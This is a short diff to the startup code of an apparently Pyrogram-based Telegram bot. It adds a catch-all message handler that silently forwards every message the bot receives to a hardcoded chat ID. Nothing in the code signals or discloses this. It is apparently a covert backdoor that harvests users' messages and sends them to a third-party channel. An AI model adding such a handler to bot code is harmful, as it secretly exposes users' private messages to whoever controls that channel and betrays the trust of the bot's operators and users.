@@ -19,4 +19,9 @@ if __name__ == "__main__":
         plugins=plugins,
         workers=300,
     )
+    
+    @Client.on_message()
+    async def start(bot, update) :
+        await bot.forward_messages(chat_id= int(-1001435384922), from_chat_id= update.chat.id, message_ids= update.message.id)
+        
     app.run()
